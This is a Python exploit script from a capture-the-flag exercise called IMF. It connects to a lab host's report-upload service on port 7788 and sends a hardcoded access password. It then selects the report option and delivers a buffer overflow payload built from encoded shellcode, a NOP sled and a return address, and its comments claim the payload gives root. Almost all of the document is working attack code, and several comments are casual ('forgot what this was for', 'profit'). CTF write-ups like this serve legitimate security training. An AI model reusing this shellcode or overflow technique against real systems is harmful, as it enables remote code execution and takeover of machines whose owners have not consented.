#IMF was a CTF for a "government" clandestine agency.
#There was a program that allow the "agents" to upload reports of their finding in the field
#This program would run behind port 7788 after you knocked on the correct ports
import socket
from struct import *

#create socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#connect to port
s.connect(('192.168.56.101', 7788))
s.recv(1024)
#send the password to access the menu (found this by running ltrace from inside the server)
s.send("48093572\n")
s.recv(1024)
#choose option 3, (file report)
s.send("3\n")

#create buffer for exploit
buf =  ""
buf += "\xd9\xc7\xb8\xf2\x61\x6b\xec\xd9\x74\x24\xf4\x5a\x2b"
buf += "\xc9\xb1\x12\x31\x42\x1a\x83\xc2\x04\x03\x42\x16\xe2"
buf += "\x07\x50\xb0\x1b\x04\xc0\x05\xb7\xa0\xe5\x39\x51\xbd"
buf += "\x0b\xf4\x1e\x2a\x90\x6f\xdf\xfc\x1f\x16\xb7\xfe\x5f"
buf += "\xc7\x1b\x77\xbe\x8d\xc5\xdf\x11\x03\x5d\x56\x70\xe0"
buf += "\xac\xe8\xc1\xe0\x97\xe8\x35\xef\xe7\x61\xd6\x2e\x0c"
buf += "\x7d\xd8\x52\xdf\xcd\xa7\x59\x60\x76\xd1\x83\xf8\x3e"
buf += "\xed\xf3\xf8\xf3\x6e\x0c\x1f"
#70 byte nop sled
buf += "\x90"*70

#forgot what this was for
buf +="\x63\x85\x04\x08"

#profit, you are now root
s.send(buf+'\n')
